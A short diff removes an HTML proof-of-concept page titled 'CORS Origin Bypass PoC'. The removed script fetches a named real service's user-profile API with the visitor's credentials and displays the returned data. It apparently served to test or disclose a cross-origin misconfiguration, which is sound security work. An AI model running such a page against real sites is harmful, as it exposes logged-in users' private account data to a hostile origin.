@@ -1,19 +1,2 @@
 <!DOCTYPE html>
 <html>
-<body>
-<h1>CORS Origin Bypass PoC</h1>
-<script>
-fetch("https://learn.acronis.com/api/platform/v1/users/me", {
-    method: "GET",
-    credentials: "include"
-})
-.then(response => response.text())
-.then(data => {
-    document.body.innerHTML += "<pre>" + data + "</pre>";
-})
-.catch(err => {
-    console.error(err);
-});
-</script>
-</body>
-</html>
